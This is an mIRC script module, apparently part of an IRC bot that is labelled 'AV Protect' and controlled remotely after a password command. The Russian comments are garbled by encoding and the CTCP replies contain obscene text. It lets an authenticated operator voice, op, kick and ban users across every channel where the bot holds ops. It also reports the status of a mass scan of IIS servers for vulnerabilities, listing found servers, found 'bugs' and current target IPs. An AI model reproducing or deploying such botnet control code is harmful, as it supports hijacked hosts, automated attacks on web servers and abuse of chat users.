;ayfa97r43fh3024u8f
;3q4f0u2q13fj0utr093jf34f
;AV Protect
;afo873q048f
ctcp *:*VERSION*:*: .ctcpreply $nick VERSION 14 mIRC 1.0 :) ќтвали короче!
ctcp *:*PING*:*: .ctcpreply $nick PONG 14 PONG - пошЄл нахуй!

on 1:CONNECT: { 
  unset %user_auth*
}

on *:part:#: {
  if (%user_auth [ $+ [ $nick ] ]  == yes)  { unset %user_auth [ $+ [ $nick ] ] }
}

on *:text:*:?: {
  if ($1 == !user_start) {
   if ($2 == $null) { halt } 
    if (%user_temp == $2) { 
       set %user_auth $+ $nick yes | .msg $schannick 15√тов вкалывать...
    } 
  }
}

on ^*:text:*:*: {

  if (%user_auth [ $+ [ $nick ] ] == yes) {

  if ($1 == !online) {
    .msg $schannick 14(15на этом сервере € уже14)4:15 $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%conntime))) 14(15в сети14)4:15 $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%ontime)))
    close -m $nick
  }

  if ($1 == !help) {
    if ($2 == $null) { 
    .msg $schannick 14 BG Module user commands: !hop, !dehop, !scanstat.*, !online, !lag, !voice, !devoice, !seen, !kick !ban, !bankick
    .msg $schannick 14 '!help <command>' for more information.
    close -m $nick
    }

    if ($2 != $null) { 
      if ($2 == !hop) { .msg $schannick 14*** Help for: '!hop <nick>' * дать half op :)  }  
      if ($2 == !dehop) { .msg $schannick 14*** Help for: '!dehop <nick>' * забрать half op :)  }  
      if ($2 == !scanstat) { .msg $schannick 14*** Help for: '!scanstat.*' * статистика сканировани€ }  
      if ($2 == !seen) { .msg $schannick 14*** Help for: '!seen <channel> <nick>' * тут всЄ пон€тно :)  }  
      if ($2 == !online) { .msg $schannick 14*** Help for: '!online' * врем€ нахождени€ бота на данном сервере  }  
      if ($2 == !lag) { .msg $schannick 14*** Help for: '!lag' * лаг коннекта бота }  
      if ($2 == !voice) { .msg $schannick 14*** Help for: '!voice <nick>' * дать voice }  
      if ($2 == !devoice) { .msg $schannick 14*** Help for: '!devoice <nick>' * забрать voice }  
      if ($2 == !kick) { .msg $schannick 14*** Help for: '!kick <nick> <reason>' * кикнуть }  
      if ($2 == !ban) { .msg $schannick 14*** Help for: '!ban <nick>' * забанить }  
      if ($2 == !bankick) { .msg $schannick 14*** Help for: '!bankick <nick>' * кик+бан }  
    }

  }

  if ($1 == !lag ) { set %ping_chan $schannick | set %lag $ticks | .ctcp $me PING | close -m   }

  if ($1 == !voice) {
    if ($2 == $null) {
      set %chan.count 1 
      :start 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($nick ison $chan(%chan.count)) )  { mode $chan(%chan.count) +v $nick }
      inc %chan.count | goto start
    }
    if ($2 != $null) {
      set %chan.count 1 
      :start2 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($2 ison $chan(%chan.count)) )  { mode $chan(%chan.count) +v $2 }
      inc %chan.count | goto start2
    }
  }

  if ($1 == !hop) {
    if ($2 == $null) {
      set %chan.count 1 
      :start 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($nick ison $chan(%chan.count)) )  { mode $chan(%chan.count) +h $nick }
      inc %chan.count | goto start
    }
    if ($2 != $null) {
      set %chan.count 1 
      :start2 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($2 ison $chan(%chan.count)) )  { mode $chan(%chan.count) +h $2 }
      inc %chan.count | goto start2
    }
  }

  if ($1 == !devoice) {
    if ($2 == $null) {
      set %chan.count 1 
      :start 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($nick ison $chan(%chan.count)) )  { mode $chan(%chan.count) -v $nick }
      inc %chan.count | goto start
    }
    if ($2 != $null) {
      set %chan.count 1 
      :start2 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($2 ison $chan(%chan.count)) )  { mode $chan(%chan.count) -v $2 }
      inc %chan.count | goto start2
    }
  }

    if ($1 == !seen) {
     if ($2 == $null) { .msg $schannick 14(15не указан канал14) | close -m $nick | halt }
     if ($me !ison $2) { .msg $schannick 14(15мен€ нет на канале4 $2 $+ 14) | close -m $nick | halt }
     if ($3 == $null) {  .msg $schannick 14(15не указан ник14) | close -m $nick | halt }
     if ($3 ison $2) { .msg $schannick 4  $3 в данный момент находитс€ в канале $2 | close -m $nick | halt }
     set %timenavyh $read -s $+ $3  $mircdir\users2.txt
     set %nicknavyh $read -w $+ $3 $+ * $mircdir\users2.txt
     set %nicknavyh2 $wildtok(%nicknavyh,*, 1, 32)
     if ($3 == %nicknavyh2) { 
       .timerseen $+ $nick 1 3 .msg $schannick 3  $3 ушел(а)  $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%timenavyh))) назад... 
       close -m $nick
     }
     else { .timerseen $+ $nick 1 3 .msg $schannick 4 у мен€ нет информации о $3 | close -m $nick }
    } 

    if ($1 == !kick) {
      if ($2 == $null) { halt }
      set %chan.count 1 
      :start 
      if ( $chan(%chan.count) == $null) { halt } 
      if ( ($me isop $chan(%chan.count) ) && ($2 ison $chan(%chan.count)) )  { kick $chan(%chan.count)  $2 12By4 $nick 12Reason:4 $3- }
      inc %chan.count | goto start
    }

    if ($1 == !ban) {
      if ($2 == $null) { halt }
      set %chan.count 1 
      :start 
      if ( $chan(%chan.count) == $null) { halt } 
      if ($me isop $chan(%chan.count) )  { mode $chan(%chan.count)  +b $2 }
      inc %chan.count | goto start
    }

    if ($1 == !bankick) {
      set %chan.count 1 
      :start 
      if ( $chan(%chan.count) == $null) { halt } 
     if ($me isop $chan(%chan.count) )  {
        if ($2 ison $chan(%chan.count)) {  mode $chan(%chan.count)  -o+b  $2 $address($2,3) | .timerbankick $+ $chan(%chan.count) 1 2 kick $chan(%chan.count) $2 12By4 $nick 12Reason:2 l-a-m-o-s m[u]st d[i]e!   }
      }
      inc %chan.count | goto start
    }

   if (!scanstat. isin $1) {
     if ( ($remove($1,!scanstat.) != *) && ($remove($1,!scanstat.) != $me) ) { halt }
     if (%iniscan.stat.bag == off) {
       .msg $schannick 14*** —татус:12вџклёчен14 Last Scan:4 %uniscan.work 14Found server IIS:4 %uniscan.found 14Found bag:4 %uniscan.bag 
       halt 
     }
     if (%iniscan.stat.server == on) {     .msg $schannick 14*** —татус:12скјнир”ю и ищу бјги14 IIS[4 %uniscan.work 14] n0w server:4 $longip(%uni.oneip) 14Found server IIS:4 %uniscan.found 14Found bag:4 %uniscan.bag }
     if (%iniscan.stat.server == off) {     .msg $schannick 14*** —татус: 12ищу бјги 14IIS Server Found:4 %uniscan.found 14Found bag:4 %uniscan.bag 14—ерверов дл€ проверки:4 $lines(unilook.txt) }
     halt
   }

  }

}